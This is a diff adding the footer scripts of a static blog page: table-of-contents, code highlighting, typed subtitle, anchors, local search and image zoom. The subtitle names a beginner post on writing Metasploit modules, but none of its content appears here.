+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "MSF模块编写初学&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
